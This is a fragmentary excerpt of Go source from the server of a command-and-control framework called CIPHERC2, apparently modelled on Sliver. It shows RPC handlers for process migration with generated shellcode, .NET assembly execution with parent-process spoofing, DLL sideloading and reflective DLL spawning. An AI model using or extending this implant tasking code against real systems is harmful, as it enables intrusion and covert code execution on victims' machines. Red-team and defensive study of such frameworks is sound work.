...
import (
	...
	"github.com/cs23m001/CIPHERC2/server/sgn"
...
func (rpc *Server) Task(ctx context.Context, req *CIPHERC2pb.TaskReq) (*CIPHERC2pb.Task, error) {
	resp := &CIPHERC2pb.Task{Response: &commonpb.Response{}}
...
func (rpc *Server) Migrate(ctx context.Context, req *clientpb.MigrateReq) (*CIPHERC2pb.Migrate, error) {
	var shellcode []byte
	...
	shellcode, arch, err := getCIPHERC2Shellcode(name)
	if err != nil {
		config := req.Config
		if req.Name == "" {
		...
		shellcodePath, err := generate.CIPHERC2Shellcode(name, build, config, httpC2Config.ImplantConfig)
		if err != nil {
			return nil, err
		}
	...
	migrateReq := &CIPHERC2pb.InvokeMigrateReq{
		Request:  req.Request,
		Data:     shellcode,
		Pid:      req.Pid,
	...
	resp := &CIPHERC2pb.Migrate{Response: &commonpb.Response{}}
...
func (rpc *Server) ExecuteAssembly(ctx context.Context, req *CIPHERC2pb.ExecuteAssemblyReq) (*CIPHERC2pb.ExecuteAssembly, error) {
	var session *core.Session
	var beacon *clientpb.Beacon
	var dbBeacon *models.Beacon
	var err error
	...
	resp := &CIPHERC2pb.ExecuteAssembly{Response: &commonpb.Response{}}
	if req.InProcess {
		tasksLog.Infof("Executing assembly in-process")
		invokeInProcExecAssembly := &CIPHERC2pb.InvokeInProcExecuteAssemblyReq{
			Data:       req.Assembly,
			Runtime:    req.Runtime,
		...
		invokeExecAssembly := &CIPHERC2pb.InvokeExecuteAssemblyReq{
			Data:        shellcode,
			Process:     req.Process,
			Request:     req.Request,
			PPid:        req.PPid,
...
func (rpc *Server) Sideload(ctx context.Context, req *CIPHERC2pb.SideloadReq) (*CIPHERC2pb.Sideload, error) {
	var (
	...
	resp := &CIPHERC2pb.Sideload{Response: &commonpb.Response{}}
	err = rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
...
func (rpc *Server) SpawnDll(ctx context.Context, req *CIPHERC2pb.InvokeSpawnDllReq) (*CIPHERC2pb.SpawnDll, error) {
	var session *core.Session
	var beacon *clientpb.Beacon
	var dbBeacon *models.Beacon
	var err error
	...
	resp := &CIPHERC2pb.SpawnDll{Response: &commonpb.Response{}}
	offset, err := getExportOffsetFromMemory(req.Data, req.EntryPoint)
	if err != nil {
		return nil, err
	}
	spawnDLLReq := &CIPHERC2pb.SpawnDllReq{
		Data:        req.Data,
		Offset:      offset,
		ProcessName: req.ProcessName,
		Args:        req.Args,
...
// Utility functions
func getCIPHERC2Shellcode(name string) ([]byte, string, error) {
	var data []byte
